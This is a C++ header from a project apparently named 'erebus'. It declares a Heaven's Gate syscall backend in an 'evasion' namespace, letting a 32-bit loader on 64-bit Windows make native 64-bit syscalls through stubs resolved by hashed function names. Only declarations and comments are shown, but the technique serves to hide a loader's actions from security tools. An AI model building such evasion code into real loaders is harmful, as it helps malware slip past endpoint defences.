#ifndef EREBUS_HEAVENS_GATE_HPP
#define EREBUS_HEAVENS_GATE_HPP
#pragma once

// Heaven's Gate syscall backend.
//
// Allows a 32-bit (x86) loader running on 64-bit Windows to issue native
// 64-bit syscalls by switching to code-segment 0x33 (the 64-bit CS) via a
// far call, executing the syscall instruction in 64-bit mode, then switching
// back to CS 0x23 (32-bit compat) via a far ret.
//
// Requirements:
//   - ARCH=x86 build on a 64-bit host (WoW64 process)
//   - CONFIG_SYSCALL_BACKEND=2
//
// Usage: call HvGate(ssn, arg1, arg2, ..., argN) with up to 11 args
// (the maximum any Nt* function in the registry needs). HvGate resolves
// SSNs from the 64-bit ntdll mapped by WoW64 and issues the syscall.

#ifdef __cplusplus
extern "C" {
#endif

// Internal: issue a 64-bit syscall by SSN with up to 11 32-bit-wide args.
// Args are widened to QWORD by the thunk before being placed in the
// correct 64-bit registers / stack slots. Defined in heavens_gate.S.
NTSTATUS HvGateCall(ULONG ssn, ...);

#ifdef __cplusplus
}
#endif

namespace erebus {
namespace evasion {

// One-time setup: walk the 64-bit ntdll mapped by WoW64 and extract SSNs
// for every Nt* function we intend to call. Must be called before any
// HvGate-dispatched syscall. Returns FALSE if 64-bit ntdll cannot be
// located (non-WoW64 process, or OS too old).
BOOL InitHeavensGate();

// Resolve a syscall stub by hashed function name. The returned pointer,
// when cast to the native Nt* signature, will trampoline through HvGateCall
// using the pre-resolved SSN. Returns NULL if not initialised or not found.
PVOID GetHeavensGateStub(ULONG funcHash);

} // namespace evasion
} // namespace erebus

#endif // EREBUS_HEAVENS_GATE_HPP
